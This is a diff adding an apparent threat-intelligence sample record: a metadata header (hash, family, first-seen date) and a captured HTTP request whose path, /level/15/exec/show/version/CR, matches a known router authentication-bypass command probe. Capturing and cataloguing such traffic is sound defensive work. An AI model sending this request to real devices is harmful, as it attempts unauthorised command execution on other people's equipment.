@@ -1,0 +1,16 @@
+# sha256: 765dbdaa71106ccb5a8f4dca760e93195ff1361776783d628def75a5657dd82f
+# family: script_generic
+# kind: script
+# size_bytes: 207
+# first_seen: 2026-09-13 23:51:08.042482 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+GET /level/15/exec/show/version/CR HTTP/1.1
+Host: 190.179.140.166:4243
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+Accept: application/json
+Accept-Encoding: gzip
+Connection: close
+
